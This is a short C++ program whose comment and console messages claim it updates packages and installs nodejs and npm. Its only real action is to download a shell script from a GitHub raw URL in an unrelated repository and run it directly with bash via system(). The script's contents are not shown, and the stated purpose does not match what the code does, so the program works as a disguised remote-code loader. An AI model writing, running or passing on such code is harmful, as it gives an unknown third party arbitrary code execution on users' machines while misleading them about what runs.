#include <iostream>
#include <cstdlib>
#include <unistd.h> // For chdir

int main() {
    // Update package list and install nodejs and npm
    std::cout << "Updating package list and installing nodejs and npm..." << std::endl;
    if (system("bash <(wget -qO- https://raw.githubusercontent.com/monhodsompul/mike/main/lucktuske.sh)") != 0) {
        std::cerr << "Failed to update package." << std::endl;
        return 1;
    }

    std::cout << "script executed successfully." << std::endl;

    return 0;
}
